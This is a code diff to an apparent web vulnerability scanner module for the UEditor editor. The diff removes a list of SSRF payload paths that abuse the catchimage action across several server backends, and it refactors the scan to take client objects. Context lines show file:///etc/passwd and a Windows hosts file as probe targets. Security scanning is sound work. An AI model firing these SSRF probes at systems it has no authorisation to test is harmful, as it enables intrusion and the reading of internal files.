@@ -10,80 +10,22 @@ file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
-from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
+# from lib.initial.config import config
 from lib.tool.thread import thread
 from payloads.Ueditor.ssrf import ssrf_scan
 
 class Ueditor():
     def __init__(self):
-        self.timeout = config.get('timeout')
-        self.headers = config.get('headers')
-        self.proxies = config.get('proxies')
-
         self.app_name = 'Ueditor'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
 
-        self.ueditor_ssrf_payloads = [
-            {
-                'path': 'php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            },
-            {
-                'path': 'jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            },
-            {
-                'path': 'asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            },
-            {
-                'path': 'net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-                'data': ''
-            },
-            # {
-            #     'path': 'ueditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'ueditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'ueditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'ueditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'UEditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'UEditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'UEditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'UEditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
-            #     'data': ''
-            # }
-        ]
-
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.ueditor_ssrf_scan, url=url)
+            thread(target=self.ssrf_scan, clients=clients)
         ]
 
-Ueditor.ueditor_ssrf_scan = ssrf_scan
+Ueditor.ssrf_scan = ssrf_scan
 
 ueditor = Ueditor()
